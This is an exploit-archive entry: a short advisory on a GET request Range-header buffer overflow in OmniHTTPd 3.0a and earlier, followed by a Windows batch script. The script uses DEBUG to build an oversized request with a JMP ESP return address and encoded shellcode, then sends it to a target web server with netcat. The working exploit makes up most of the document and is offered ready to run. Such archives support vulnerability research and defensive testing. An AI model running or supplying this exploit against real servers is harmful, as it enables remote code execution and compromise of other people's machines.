source: http://www.securityfocus.com/bid/10376/info

Reportedly OmniHTTPD is affected by a GET request buffer overflow vulnerability. This issue is due to a failure of the application to properly validate string sizes when processing user input.

This issue could allow an attacker to execute arbitrary code with the privileges of the affected web server.

@echo off
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:Application:   OmniHTTPd
:Vendors:       http://www.omnicron.ca
:Version:       <=V3.0a
:Platforms:     Windows
:Bug:           Overflow
:Date:          2004-04-23
:Author:        CoolICE
:E-mail:        CoolICE#China.com
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
;if '%1'=='' echo Usage:%0 target&&goto :eof
;for %%n in (nc.exe) do if not exist %%~$PATH:n if not exist nc.exe echo Need
nc.exe&&goto :eof
;DEBUG < %~s0
;GOTO :run

e 100 "GET / HTTP/1.0" 0D 0A "Range: "
!Overflow@length>0xE0
f 117 206 41
!JMPESP@w2k
e 207 12 45 FA 7F
!Shellcode
e 20B EB 1B 5B BE 43 6F 6F 6C BF 49 43 45 21 43 39 3B
e 21B 75 FB 4B 80 33 88 39 73 FC 75 F7 EB 09 E8 E0 FF
e 22B FF FF 43 6F 6f 6C 61 31 88 88 88 D6 60 CE 88 88
e 23B 88 01 8E 03 50 DB E0 F6 50 6A FB 60 C4 88 88 88
e 24B 01 CE 80 DB E0 06 C6 86 64 60 B6 88 88 88 01 CE
e 25B 8C E0 BB BA 88 88 E0 DD DB CD DA DC 77 58 01 CE
e 26B 84 03 50 DB E0 07 6E AC DF 60 96 88 88 88 01 CE
e 27B 98 77 DE 98 77 DE 80 DE EC 29 B8 88 88 88 03 C8
e 28B 84 03 F8 94 25 03 C8 80 D6 4A 8C 88 DB DD DE DF
e 29B 03 E4 AC 90 03 CD B4 03 DC 8D F0 8B 5D 03 C2 90
e 2AB 03 D2 A8 8B 55 6B BA C1 03 BC 03 8B 7D BB 77 74
e 2BB BB 48 24 B2 4C FC 8F 49 47 85 8B 70 63 7A B3 F4
e 2CB AC 9C FD 69 03 D2 AC 8B 55 EE 03 84 C3 03 D2 94
e 2DB 8B 55 03 8C 03 8B 4D 63 8A BB 48 03 5D D7 D6 D5
e 2EB D3 4A 80 88 60 CA 77 77 77 49 43 45 21 0D 0A 0D
E 2FB 0A 00
rcx
1FC
nhttp.tmp
w
q


:run
nc %1 80 < http.tmp
del http.tmp